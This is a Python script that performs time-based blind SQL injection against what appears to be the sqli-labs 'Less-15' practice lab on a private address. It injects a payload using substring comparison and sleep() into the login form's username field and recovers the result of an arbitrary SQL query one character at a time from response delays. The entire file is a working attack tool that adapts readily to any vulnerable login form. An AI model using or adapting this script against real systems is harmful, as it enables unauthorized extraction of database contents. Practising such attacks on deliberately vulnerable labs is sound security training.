#!/usr/bin/env python

import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <SQL Query>

EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-15/"
result = ""
idx = 0
delay = 1

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

while True:
    idx += 1
    print("[*] Current Result: %s" % result)
    query = {
        "uname": "sa' or ((substring((%s),%d,1)='%s') and sleep(%d))-- " % (sys.argv[1], idx, "", delay),
        "passwd": "pass",
        "submit": "Submit"
    }
    print("[*] Query: %s" % query)
    print("[*] Testing: %s" % "")
    start = time.time()
    res = requests.post(url, headers=header, data=query, verify=False)
    ellapse = time.time() - start

    if(ellapse > delay):
       print("[+] DETECT: %s" % "")
       break
    else:
       pass

    for x in sourcestr:
        query = {
            "uname": "sa' or ((substring((%s),%d,1)='%s') and sleep(%d))-- " % (sys.argv[1], idx, x, delay),
            "passwd": "pass",
            "submit": "Submit"
        }
        print("[*] Query: %s" % query)
        print("[*] Testing: %s" % x)
        start = time.time()
        res = requests.post(url, headers=header, data=query, verify=False)
        ellapse = time.time() - start

        if(ellapse > delay):
            result += x
            print("[+] DETECT: %s" % x)
            break
        else:
            pass

print("[*] RESULT: %s" % result)
